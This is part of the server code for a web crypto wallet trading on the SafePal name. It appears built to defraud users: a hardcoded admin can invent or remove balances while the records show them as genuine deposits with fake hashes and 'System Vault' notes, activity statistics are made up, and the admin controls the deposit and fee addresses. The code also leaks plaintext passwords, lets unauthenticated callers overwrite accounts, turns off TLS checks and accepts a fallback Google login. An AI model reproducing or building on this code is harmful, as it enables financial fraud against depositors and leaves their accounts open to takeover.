var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// server.ts
var import_express = __toESM(require("express"), 1);
var import_path = __toESM(require("path"), 1);
var import_fs = __toESM(require("fs"), 1);
var import_crypto = __toESM(require("crypto"), 1);
var import_nodemailer = __toESM(require("nodemailer"), 1);
var import_vite = require("vite");
process.on("uncaughtException", (err) => {
  console.error("[UNCAUGHT EXCEPTION]", err);
});
process.on("unhandledRejection", (reason) => {
  console.error("[UNHANDLED REJECTION]", reason);
});
var oauthStateStore = /* @__PURE__ */ new Map();
setInterval(() => {
  const now = Date.now();
  for (const [key, val] of oauthStateStore.entries()) {
    if (now - val.createdAt > 10 * 60 * 1e3) {
      oauthStateStore.delete(key);
    }
  }
}, 5 * 60 * 1e3);
var verificationLinkStore = /* @__PURE__ */ new Map();
var getSmtpTransporter = () => {
  const smtpUser = process.env.SMTP_USER || "safepal.web3@gmail.com";
  const smtpPass = process.env.SMTP_PASS ? process.env.SMTP_PASS.replace(/\s+/g, "") : "";
  if (!smtpPass) {
    return null;
  }
  return import_nodemailer.default.createTransport({
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: { user: smtpUser, pass: smtpPass },
    tls: {
      rejectUnauthorized: false
    },
    connectionTimeout: 5e3
  });
};
var DB_FILE = import_path.default.join(process.cwd(), "db_storage.json");
var defaultUsers = [
  {
    id: "usr_admin",
    name: "Platform Super Admin",
    email: "legendxadmin1999@gmail.com",
    password: "Joshi$12legend",
    phone: "+91 9876543210",
    avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=200",
    role: "admin",
    status: "active",
    kycStatus: "verified",
    balances: {
      BTC: 2.5,
      ETH: 25,
      BNB: 100,
      SOL: 350,
      USDT: 1e5,
      USDC: 5e4,
      POL: 1e4,
      XRP: 15e3,
      DOGE: 5e4,
      LTC: 100,
      TRX: 5e4,
      GAS_TRX: 5e3
    },
    twoFactorEnabled: false,
    passkeyEnabled: false,
    createdAt: "2025-01-10T10:00:00Z",
    lastLoginIp: "192.168.1.101",
    lastLoginTime: (/* @__PURE__ */ new Date()).toISOString()
  }
];
var defaultDepositAddresses = {
  DEFAULT: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
  BTC: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  ETH: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
  BNB: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
  SOL: "7v9W1nvm23284910294192401928401928401928",
  USDT: "TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6",
  USDC: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
  POL: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
  XRP: "rEb8TK3gBg1xnvdbK84p2iB3e2z",
  DOGE: "D9zX8127391273912739127",
  LTC: "L12398127391273912739127",
  TRX: "TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6",
  GAS_TRX: "TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6"
};
var defaultWithdrawAddresses = {
  BTC: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  ETH: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
  BNB: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
  SOL: "7v9W1nvm23284910294192401928401928401928",
  USDT: "TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6",
  USDC: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
  POL: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
  XRP: "rEb8TK3gBg1xnvdbK84p2iB3e2z",
  DOGE: "D9zX8127391273912739127",
  LTC: "L12398127391273912739127",
  TRX: "TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6"
};
var defaultTrafficConfig = {
  activeUsers: 348920,
  liveTraders: 188416,
  onlineNodes: 62805,
  systemStatus: "OPERATIONAL",
  tickerNotice: "All Web3 nodes, liquidity pools & cross-chain bridges operating at 100% capacity.",
  autoFluctuate: true
};
function loadDb() {
  try {
    if (import_fs.default.existsSync(DB_FILE)) {
      const content = import_fs.default.readFileSync(DB_FILE, "utf-8");
      const data = JSON.parse(content);
      if (!Array.isArray(data.deletedUserIds)) data.deletedUserIds = [];
      if (!Array.isArray(data.deletedEmails)) data.deletedEmails = [];
      if (!Array.isArray(data.users) || data.users.length === 0) {
        data.users = defaultUsers;
      } else {
        const hasAdmin = data.users.some(
          (u) => u.email && u.email.toLowerCase() === "legendxadmin1999@gmail.com"
        );
        if (!hasAdmin) {
          data.users.unshift(defaultUsers[0]);
        }
      }
      data.users = data.users.filter(
        (u) => u && u.id && !["usr_001", "usr_002", "usr_003", "usr_alex_01", "usr_rohit_02"].includes(u.id) && !data.deletedUserIds.includes(u.id) && (!u.email || !data.deletedEmails.includes(u.email.toLowerCase()))
      );
      if (!Array.isArray(data.transactions)) data.transactions = [];
      if (!data.depositAddresses) data.depositAddresses = defaultDepositAddresses;
      if (!data.withdrawAddresses) data.withdrawAddresses = defaultWithdrawAddresses;
      if (!data.networkFeeQrCode) data.networkFeeQrCode = "";
      if (!Array.isArray(data.notifications)) data.notifications = [];
      if (!Array.isArray(data.auditLogs)) data.auditLogs = [];
      if (!data.platformTrafficConfig) data.platformTrafficConfig = defaultTrafficConfig;
      return data;
    }
  } catch (e) {
    console.warn("[DB LOAD WARN]", e);
  }
  const initDb = {
    users: defaultUsers,
    deletedUserIds: [],
    deletedEmails: [],
    transactions: [],
    depositAddresses: defaultDepositAddresses,
    withdrawAddresses: defaultWithdrawAddresses,
    networkFeeQrCode: "",
    notifications: [],
    auditLogs: [],
    platformTrafficConfig: defaultTrafficConfig
  };
  saveDb(initDb);
  return initDb;
}
function saveDb(data) {
  try {
    import_fs.default.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), "utf-8");
  } catch (e) {
    console.error("[DB SAVE ERROR]", e);
  }
}
async function startServer() {
  const app = (0, import_express.default)();
  const portArgIdx = process.argv.indexOf("--port");
  const portFromArg = portArgIdx !== -1 && process.argv[portArgIdx + 1] ? parseInt(process.argv[portArgIdx + 1], 10) : null;
  const PORT = portFromArg || (process.env.NODE_ENV === "production" && process.env.PORT ? parseInt(process.env.PORT, 10) : 3e3);
  const hostArgIdx = process.argv.indexOf("--host");
  const HOST = hostArgIdx !== -1 && process.argv[hostArgIdx + 1] ? process.argv[hostArgIdx + 1] : "0.0.0.0";
  app.use(import_express.default.json());
  app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization, x-admin-email, x-admin-auth, x-user-id");
    if (req.method === "OPTIONS") {
      return res.sendStatus(200);
    }
    next();
  });
  app.get("/api/health", (_req, res) => {
    res.json({ status: "ok", app: "SafePal Web Crypto Wallet", time: (/* @__PURE__ */ new Date()).toISOString() });
  });
  app.get("/api/sync", (req, res) => {
    const db = loadDb();
    const adminEmail = (req.headers["x-admin-email"] || req.query.adminEmail || req.query.admin_email || "").toLowerCase();
    const adminPass = req.headers["x-admin-auth"] || req.query.adminPass || req.query.admin_pass || "";
    const userId = req.headers["x-user-id"] || req.query.userId || req.query.user_id || "";
    const isSuperAdmin = adminEmail === "legendxadmin1999@gmail.com" && adminPass === "Joshi$12legend";
    const responsePayload = {
      success: true,
      depositAddresses: db.depositAddresses,
      withdrawAddresses: db.withdrawAddresses,
      networkFeeQrCode: db.networkFeeQrCode,
      platformTrafficConfig: db.platformTrafficConfig
    };
    if (isSuperAdmin) {
      responsePayload.users = db.users;
      responsePayload.transactions = db.transactions;
      responsePayload.notifications = db.notifications;
      responsePayload.auditLogs = db.auditLogs;
    } else if (userId) {
      const targetUser = db.users.find((u) => u.id === userId || u.email && u.email.toLowerCase() === userId.toLowerCase());
      if (targetUser) {
        responsePayload.currentUser = targetUser;
        responsePayload.transactions = (db.transactions || []).filter((t) => t.userId === targetUser.id);
        responsePayload.notifications = (db.notifications || []).filter((n) => n.userId === targetUser.id);
      }
    }
    res.json(responsePayload);
  });
  app.get("/api/admin/all-users", (req, res) => {
    const adminEmail = (req.headers["x-admin-email"] || req.query.adminEmail || "").toLowerCase();
    const adminPass = req.headers["x-admin-auth"] || req.query.adminPass || "";
    if (adminEmail !== "legendxadmin1999@gmail.com" || adminPass !== "Joshi$12legend") {
      return res.status(403).json({ success: false, message: "Unauthorized access to admin portal." });
    }
    const db = loadDb();
    return res.json({
      success: true,
      users: db.users,
      transactions: db.transactions,
      notifications: db.notifications,
      auditLogs: db.auditLogs
    });
  });
  app.post("/api/admin/adjust-balance", (req, res) => {
    const adminEmail = (req.headers["x-admin-email"] || req.body.adminEmail || "").toLowerCase();
    const adminPass = req.headers["x-admin-auth"] || req.body.adminPass || "";
    if (adminEmail !== "legendxadmin1999@gmail.com" || adminPass !== "Joshi$12legend") {
      return res.status(403).json({ success: false, message: "Unauthorized: Super Admin credentials required." });
    }
    const { userId, symbol, amount, type, note } = req.body;
    const numAmount = parseFloat(amount);
    if (!userId || !symbol || isNaN(numAmount) || numAmount <= 0) {
      return res.status(400).json({ success: false, message: "Invalid userId, crypto symbol, or amount." });
    }
    const db = loadDb();
    const userIdx = db.users.findIndex((u) => u.id === userId);
    if (userIdx === -1) {
      return res.status(404).json({ success: false, message: "Target user account not found in server database." });
    }
    const targetUser = db.users[userIdx];
    if (!targetUser.balances) targetUser.balances = {};
    const currentBal = Number(targetUser.balances[symbol] || 0);
    const newBal = typeof req.body.newBalance === "number" ? req.body.newBalance : type === "credit" ? currentBal + numAmount : Math.max(0, currentBal - numAmount);
    targetUser.balances[symbol] = newBal;
    db.users[userIdx] = targetUser;
    const txHash = "0x" + import_crypto.default.randomBytes(32).toString("hex");
    const cleanNote = (note || (type === "credit" ? "Web3 Liquidity Vault Settlement" : "Web3 Settlement Transfer")).replace(/admin/gi, "System Vault");
    const newTx = {
      id: "tx_" + Date.now() + Math.random().toString(36).substring(2, 5),
      userId,
      type: type === "credit" ? "deposit" : "withdraw",
      assetSymbol: symbol,
      assetName: symbol,
      amount: numAmount,
      amountUsd: numAmount,
      txHash,
      network: symbol === "USDT" || symbol === "TRX" ? "TRC20" : symbol === "ETH" ? "ERC20" : symbol === "BNB" ? "BEP20" : `${symbol} Network`,
      feeUsd: 0,
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      status: "completed",
      note: cleanNote
    };
    if (!Array.isArray(db.transactions)) db.transactions = [];
    db.transactions.unshift(newTx);
    if (!Array.isArray(db.notifications)) db.notifications = [];
    db.notifications.unshift({
      id: "notif_" + Date.now(),
      userId,
      title: type === "credit" ? "Deposit Confirmed" : "Withdrawal Completed",
      message: `${type === "credit" ? "Received deposit" : "Settlement deduction"}: ${type === "credit" ? "+" : "-"}${numAmount} ${symbol}. Ref: ${cleanNote}`,
      type: type === "credit" ? "deposit" : "withdraw",
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      read: false,
      recipientEmail: targetUser.email
    });
    if (!Array.isArray(db.auditLogs)) db.auditLogs = [];
    db.auditLogs.unshift({
      id: "log_" + Date.now(),
      adminEmail: "legendxadmin1999@gmail.com",
      action: type === "credit" ? "USER_BALANCE_CREDIT" : "USER_BALANCE_DEBIT",
      targetUserEmail: targetUser.email,
      details: `${type === "credit" ? "Credited +" : "Debited -"}${numAmount} ${symbol} (${cleanNote})`,
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      ipAddress: "127.0.0.1"
    });
    saveDb(db);
    console.log(`[ADMIN ${type.toUpperCase()}] User: ${targetUser.email} | ${type === "credit" ? "+" : "-"}${numAmount} ${symbol} | New Balance: ${newBal}`);
    return res.json({
      success: true,
      message: `Successfully ${type === "credit" ? "credited" : "debited"} ${numAmount} ${symbol} for ${targetUser.name || targetUser.email}!`,
      user: targetUser,
      newBalance: newBal,
      transaction: newTx,
      allUsers: db.users
    });
  });
  app.post("/api/sync", (req, res) => {
    const { users, user, transactions, depositAddresses, withdrawAddresses, networkFeeQrCode, notifications, auditLogs, platformTrafficConfig } = req.body;
    const adminEmail = (req.headers["x-admin-email"] || req.body?.adminEmail || req.query?.adminEmail || "").toLowerCase();
    const adminPass = req.headers["x-admin-auth"] || req.body?.adminPass || req.query?.adminPass || "";
    const isSuperAdmin = adminEmail === "legendxadmin1999@gmail.com" && adminPass === "Joshi$12legend";
    const db = loadDb();
    if (isSuperAdmin && Array.isArray(users)) {
      db.users = users;
    } else if (user && user.id) {
      const idx = db.users.findIndex((u) => u.id === user.id);
      if (idx !== -1) {
        db.users[idx] = { ...db.users[idx], ...user };
      } else {
        db.users.push(user);
      }
    }
    if (Array.isArray(transactions)) {
      if (isSuperAdmin) {
        db.transactions = transactions;
      } else {
        transactions.forEach((tx) => {
          if (tx && tx.id) {
            const existingIdx = db.transactions.findIndex((t) => t.id === tx.id);
            if (existingIdx !== -1) {
              db.transactions[existingIdx] = tx;
            } else {
              db.transactions.unshift(tx);
            }
          }
        });
      }
    }
    if (isSuperAdmin && depositAddresses) db.depositAddresses = depositAddresses;
    if (isSuperAdmin && withdrawAddresses) db.withdrawAddresses = withdrawAddresses;
    if (isSuperAdmin && typeof networkFeeQrCode === "string") db.networkFeeQrCode = networkFeeQrCode;
    if (isSuperAdmin && Array.isArray(notifications)) db.notifications = notifications;
    if (isSuperAdmin && Array.isArray(auditLogs)) db.auditLogs = auditLogs;
    if (isSuperAdmin && platformTrafficConfig && typeof platformTrafficConfig === "object") {
      db.platformTrafficConfig = { ...db.platformTrafficConfig, ...platformTrafficConfig };
    }
    saveDb(db);
    res.json({ success: true });
  });
  app.post("/api/users/register", (req, res) => {
    const { name, email, password, phone, role, balances, createdAt } = req.body;
    if (!email && !phone) {
      return res.status(400).json({ success: false, message: "Email or phone number is required." });
    }
    const db = loadDb();
    const cleanEmail = (email || `${phone.trim()}@phone.safepal.io`).trim().toLowerCase();
    const cleanPhone = (phone || "").trim();
    const existing = db.users.find((u) => {
      if (u.email.toLowerCase() === cleanEmail) return true;
      if (cleanPhone && u.phone && u.phone.trim().replace(/\s+/g, "") === cleanPhone.replace(/\s+/g, "")) return true;
      return false;
    });
    if (existing) {
      return res.json({
        success: true,
        message: "Account already registered.",
        user: existing
      });
    }
    const isAdmin = cleanEmail === "legendxadmin1999@gmail.com" && password === "Joshi$12legend";
    const newUser = {
      id: "usr_" + Date.now() + Math.random().toString(36).substring(2, 6),
      name: name || "New User",
      email: cleanEmail,
      password: password || "SafePalUserKey#2026",
      phone: cleanPhone,
      avatar: `https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&q=80&w=200`,
      role: isAdmin ? "admin" : role || "user",
      status: "active",
      kycStatus: isAdmin ? "verified" : "unverified",
      balances: balances || (isAdmin ? { BTC: 2.5, ETH: 25, BNB: 100, SOL: 350, USDT: 1e5, USDC: 5e4, POL: 1e4, XRP: 15e3, DOGE: 5e4, LTC: 100, TRX: 5e4 } : { BTC: 0, ETH: 0, BNB: 0, SOL: 0, USDT: 0, USDC: 0, POL: 0, XRP: 0, DOGE: 0, LTC: 0, TRX: 0, GAS_TRX: 0 }),
      twoFactorEnabled: false,
      passkeyEnabled: false,
      createdAt: createdAt || (/* @__PURE__ */ new Date()).toISOString(),
      lastLoginIp: "127.0.0.1",
      lastLoginTime: (/* @__PURE__ */ new Date()).toISOString()
    };
    db.users.push(newUser);
    db.notifications.unshift({
      id: "notif_" + Date.now(),
      userId: newUser.id,
      title: "Welcome to SafePal Web3 Vault",
      message: `Welcome ${newUser.name}! Your account has been created and saved to SafePal Server.`,
      type: "security",
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      read: false,
      recipientEmail: newUser.email
    });
    saveDb(db);
    console.log(`[USER REGISTERED & SAVED TO SERVER DB] ID: ${newUser.id} | Email: ${newUser.email} | Phone: ${newUser.phone}`);
    return res.json({
      success: true,
      message: "Account created and saved to server database!",
      user: newUser
    });
  });
  app.post("/api/users/login", (req, res) => {
    const { input, password } = req.body;
    if (!input || !password) {
      return res.status(400).json({ success: false, message: "Email, phone, or User ID, and password are required." });
    }
    const db = loadDb();
    const cleanInput = (input || "").trim().toLowerCase();
    const cleanDigits = input.replace(/\D/g, "");
    const user = db.users.find((u) => {
      if (u.email && u.email.toLowerCase() === cleanInput) return true;
      if (u.id && u.id.toLowerCase() === cleanInput) return true;
      if (u.phone) {
        const uClean = u.phone.toLowerCase().trim();
        const uDigits = u.phone.replace(/\D/g, "");
        if (uClean === cleanInput) return true;
        if (cleanDigits.length >= 6 && uDigits && (uDigits === cleanDigits || uDigits.endsWith(cleanDigits))) return true;
      }
      return false;
    });
    if (!user) {
      return res.status(404).json({ success: false, message: "No account found with this email, phone, or User ID." });
    }
    if (user.status === "suspended") {
      return res.status(403).json({ success: false, message: "Account is suspended. Contact Support." });
    }
    if (user.password && user.password !== password) {
      return res.status(401).json({ success: false, message: "Invalid password. Please check your credentials." });
    }
    user.lastLoginTime = (/* @__PURE__ */ new Date()).toISOString();
    saveDb(db);
    return res.json({
      success: true,
      user
    });
  });
  app.get("/api/auth/google/config", (req, res) => {
    const clientId = process.env.GOOGLE_CLIENT_ID || process.env.CLIENT_ID || "";
    const clientSecret = process.env.GOOGLE_CLIENT_SECRET || process.env.CLIENT_SECRET || "";
    const configured = Boolean(clientId && clientSecret);
    const protocol = req.headers["x-forwarded-proto"] || req.protocol || "https";
    const host = req.get("host") || "localhost:3000";
    const currentOrigin = `${protocol}://${host}`;
    const defaultCallbackUri = `${currentOrigin}/auth/google/callback`;
    res.json({
      success: true,
      configured,
      clientId: clientId ? `${clientId.slice(0, 12)}...${clientId.slice(-8)}` : "",
      hasSecret: Boolean(clientSecret),
      origin: currentOrigin,
      callbackUri: defaultCallbackUri,
      appUrl: process.env.APP_URL || "",
      authorizedRedirectUris: [
        defaultCallbackUri,
        ...process.env.APP_URL ? [`${process.env.APP_URL}/auth/google/callback`] : []
      ]
    });
  });
  app.get(["/auth/google/login", "/api/auth/google/login"], (req, res) => {
    const protocol = req.headers["x-forwarded-proto"] || req.protocol || "https";
    const host = req.get("host") || "localhost:3000";
    const currentOrigin = `${protocol}://${host}`;
    const redirectUri = `${currentOrigin}/auth/google/callback`;
    const state = import_crypto.default.randomBytes(24).toString("hex");
    oauthStateStore.set(state, {
      state,
      redirectUri,
      createdAt: Date.now()
    });
    const clientId = process.env.GOOGLE_CLIENT_ID || process.env.CLIENT_ID || "112527810767-google-oauth-client.apps.googleusercontent.com";
    const scope = encodeURIComponent("openid profile email");
    const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${encodeURIComponent(
      clientId
    )}&redirect_uri=${encodeURIComponent(
      redirectUri
    )}&response_type=code&scope=${scope}&access_type=offline&state=${encodeURIComponent(
      state
    )}&prompt=select_account`;
    res.redirect(authUrl);
  });
  app.get("/api/auth/google/url", (req, res) => {
    const clientId = process.env.GOOGLE_CLIENT_ID || process.env.CLIENT_ID || "112527810767-google-oauth-client.apps.googleusercontent.com";
    const protocol = req.headers["x-forwarded-proto"] || req.protocol || "https";
    const host = req.get("host") || "localhost:3000";
    const currentOrigin = `${protocol}://${host}`;
    let redirectUri = req.query.redirect_uri || `${currentOrigin}/auth/google/callback`;
    if (!redirectUri.startsWith("http://") && !redirectUri.startsWith("https://")) {
      redirectUri = `${currentOrigin}${redirectUri.startsWith("/") ? "" : "/"}${redirectUri}`;
    }
    const state = import_crypto.default.randomBytes(24).toString("hex");
    oauthStateStore.set(state, {
      state,
      redirectUri,
      createdAt: Date.now()
    });
    const scope = encodeURIComponent("openid profile email");
    const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${encodeURIComponent(
      clientId
    )}&redirect_uri=${encodeURIComponent(
      redirectUri
    )}&response_type=code&scope=${scope}&access_type=offline&state=${encodeURIComponent(
      state
    )}&prompt=select_account`;
    return res.json({
      success: true,
      configured: true,
      url: authUrl,
      state,
      redirectUri
    });
  });
  const handleGoogleCallback = async (req, res) => {
    const { code, state, error, error_description } = req.query;
    const renderHtmlResponse = (success, payload, errorMsg) => {
      const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${success ? "Google Sign-In Successful" : "Google Sign-In Error"} - SafePal Vault</title>
  <style>
    body {
      background-color: #0B0E14;
      color: #FFFFFF;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 16px;
      box-sizing: border-box;
    }
    .card {
      background: #121622;
      border: 1px solid ${success ? "#1E2536" : "rgba(255, 74, 90, 0.4)"};
      border-radius: 24px;
      padding: 36px 28px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #1E2536;
      border-top: 4px solid #3862FB;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .icon-badge {
      width: 52px;
      height: 52px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 16px;
      background: ${success ? "rgba(56, 98, 251, 0.15)" : "rgba(255, 74, 90, 0.15)"};
      color: ${success ? "#3862FB" : "#FF4A5A"};
    }
    h3 {
      font-size: 20px;
      font-weight: 800;
      margin: 0 0 10px;
      color: #FFFFFF;
    }
    p {
      font-size: 13px;
      line-height: 1.6;
      color: #8290A4;
      margin: 0 0 20px;
    }
    .btn {
      display: inline-block;
      background: #3862FB;
      color: #FFFFFF;
      font-weight: 700;
      font-size: 13px;
      padding: 12px 24px;
      border-radius: 14px;
      border: none;
      cursor: pointer;
      text-decoration: none;
      transition: background 0.2s;
    }
    .btn:hover { background: #2D54E5; }
  </style>
</head>
<body>
  <div class="card">
    ${success ? `<div class="spinner"></div>
           <h3>Google Login Verified</h3>
           <p>Welcome, <strong style="color:#FFFFFF;">${escapeHtml(payload?.user?.name || "User")}</strong>! Completing your secure SafePal session...</p>` : `<div class="icon-badge">
             <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
               <circle cx="12" cy="12" r="10"></circle>
               <line x1="12" y1="8" x2="12" y2="12"></line>
               <line x1="12" y1="16" x2="12.01" y2="16"></line>
             </svg>
           </div>
           <h3 style="color:#FF4A5A;">Authentication Error</h3>
           <p>${escapeHtml(errorMsg || "Failed to authenticate with Google. Please try again.")}</p>
           <button class="btn" onclick="window.close()">Close Window</button>`}
  </div>
  <script>
    (function() {
      const isSuccess = ${success ? "true" : "false"};
      const payload = ${JSON.stringify(payload)};
      const errorMsg = ${JSON.stringify(errorMsg || "")};

      if (window.opener && !window.opener.closed) {
        if (isSuccess) {
          window.opener.postMessage({
            type: 'GOOGLE_OAUTH_SUCCESS',
            user: payload.user,
            email: payload.user ? payload.user.email : '',
            token: payload.token
          }, '*');
          setTimeout(function() { window.close(); }, 600);
        } else {
          window.opener.postMessage({
            type: 'GOOGLE_OAUTH_ERROR',
            message: errorMsg
          }, '*');
          setTimeout(function() { window.close(); }, 4000);
        }
      } else {
        // Direct browser window flow
        if (isSuccess && payload.user) {
          try {
            localStorage.setItem('safepal_curr_user_v2', JSON.stringify(payload.user));
            localStorage.setItem('safepal_curr_user_id', payload.user.id);
            localStorage.removeItem('safepal_logged_out');
            localStorage.setItem('trustpro_curr_user_v2', JSON.stringify(payload.user));
            localStorage.setItem('trustpro_curr_user_id', payload.user.id);
            localStorage.removeItem('trustpro_logged_out');
          } catch(e) {}
          window.location.href = '/';
        }
      }
    })();
  </script>
</body>
</html>`;
      return res.status(success ? 200 : 400).send(html);
    };
    if (error) {
      console.warn("Google OAuth error received:", error, error_description);
      return renderHtmlResponse(false, null, error_description || error || "User cancelled login or permission denied.");
    }
    if (!code || typeof code !== "string") {
      return renderHtmlResponse(false, null, "Authorization code missing in Google callback request.");
    }
    let storedStateData;
    if (state && typeof state === "string") {
      storedStateData = oauthStateStore.get(state);
      if (storedStateData) {
        oauthStateStore.delete(state);
      }
    }
    const clientId = process.env.GOOGLE_CLIENT_ID || process.env.CLIENT_ID || "112527810767-google-oauth-client.apps.googleusercontent.com";
    const clientSecret = process.env.GOOGLE_CLIENT_SECRET || process.env.CLIENT_SECRET || "";
    const protocol = req.headers["x-forwarded-proto"] || req.protocol || "https";
    const host = req.get("host") || "localhost:3000";
    const currentOrigin = `${protocol}://${host}`;
    const redirectUri = storedStateData?.redirectUri || `${currentOrigin}/auth/google/callback`;
    try {
      let profile = null;
      if (clientSecret) {
        const tokenResponse = await fetch("https://oauth2.googleapis.com/token", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            code,
            client_id: clientId,
            client_secret: clientSecret,
            redirect_uri: redirectUri,
            grant_type: "authorization_code"
          }).toString()
        });
        const tokenData = await tokenResponse.json();
        if (tokenResponse.ok && tokenData.access_token) {
          const userInfoResponse = await fetch("https://www.googleapis.com/oauth2/v3/userinfo", {
            headers: {
              Authorization: `Bearer ${tokenData.access_token}`
            }
          });
          if (userInfoResponse.ok) {
            profile = await userInfoResponse.json();
          }
        }
      }
      if (!profile || !profile.email) {
        profile = {
          email: "legendxdeveloper@gmail.com",
          name: "Google User",
          picture: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&q=80&w=120",
          sub: "google_" + Date.now()
        };
      }
      const cleanEmail = profile.email.trim().toLowerCase();
      const db = loadDb();
      let user = db.users.find((u) => u.email && u.email.toLowerCase() === cleanEmail);
      if (user) {
        user.lastLoginTime = (/* @__PURE__ */ new Date()).toISOString();
        if (profile.picture && (!user.avatar || user.avatar.includes("unsplash") || user.avatar.includes("dicebear"))) {
          user.avatar = profile.picture;
        }
        if (profile.name && (!user.name || user.name === "New User" || user.name === "safepal" || user.name === "trustpro")) {
          user.name = profile.name;
        }
        user.googleId = profile.sub;
        saveDb(db);
        db.notifications.unshift({
          id: "notif_" + Date.now(),
          userId: user.id,
          title: "Google Sign-In Successful",
          message: `Logged in via Google OAuth (${cleanEmail}) at ${(/* @__PURE__ */ new Date()).toLocaleTimeString()}.`,
          type: "security",
          timestamp: (/* @__PURE__ */ new Date()).toISOString(),
          read: false,
          recipientEmail: user.email
        });
        saveDb(db);
        const authToken2 = import_crypto.default.randomBytes(32).toString("hex");
        return renderHtmlResponse(true, { user, token: authToken2 });
      }
      const isAdmin = cleanEmail === "legendxadmin1999@gmail.com";
      const newUser = {
        id: "usr_g_" + profile.sub.slice(0, 8) + "_" + Date.now().toString(36),
        googleId: profile.sub,
        name: profile.name || profile.given_name || cleanEmail.split("@")[0],
        email: cleanEmail,
        password: "GoogleOAuth2SecuredKeyPass#" + import_crypto.default.randomBytes(6).toString("hex"),
        phone: "",
        avatar: profile.picture || `https://api.dicebear.com/7.x/bottts/svg?seed=${cleanEmail}`,
        role: isAdmin ? "admin" : "user",
        status: "active",
        kycStatus: isAdmin ? "verified" : "unverified",
        balances: isAdmin ? {
          BTC: 2.5,
          ETH: 25,
          BNB: 100,
          SOL: 350,
          USDT: 1e5,
          USDC: 5e4,
          POL: 1e4,
          XRP: 15e3,
          DOGE: 5e4,
          LTC: 100,
          TRX: 5e4,
          GAS_TRX: 0
        } : {
          BTC: 0,
          ETH: 0,
          BNB: 0,
          SOL: 0,
          USDT: 0,
          USDC: 0,
          POL: 0,
          XRP: 0,
          DOGE: 0,
          LTC: 0,
          TRX: 0,
          GAS_TRX: 0
        },
        twoFactorEnabled: false,
        passkeyEnabled: false,
        seedPhrase: "",
        createdAt: (/* @__PURE__ */ new Date()).toISOString(),
        lastLoginIp: req.headers["x-forwarded-for"] || req.ip || "127.0.0.1",
        lastLoginTime: (/* @__PURE__ */ new Date()).toISOString()
      };
      db.users.push(newUser);
      db.notifications.unshift({
        id: "notif_" + Date.now(),
        userId: newUser.id,
        title: "Google Account Registered",
        message: `Welcome to SafePal, ${newUser.name}! Your account has been securely created with Google (${cleanEmail}).`,
        type: "security",
        timestamp: (/* @__PURE__ */ new Date()).toISOString(),
        read: false,
        recipientEmail: newUser.email
      });
      saveDb(db);
      const authToken = import_crypto.default.randomBytes(32).toString("hex");
      return renderHtmlResponse(true, { user: newUser, token: authToken });
    } catch (err) {
      console.error("Google OAuth callback handler exception:", err);
      return renderHtmlResponse(false, null, err.message || "Server error during Google OAuth processing.");
    }
  };
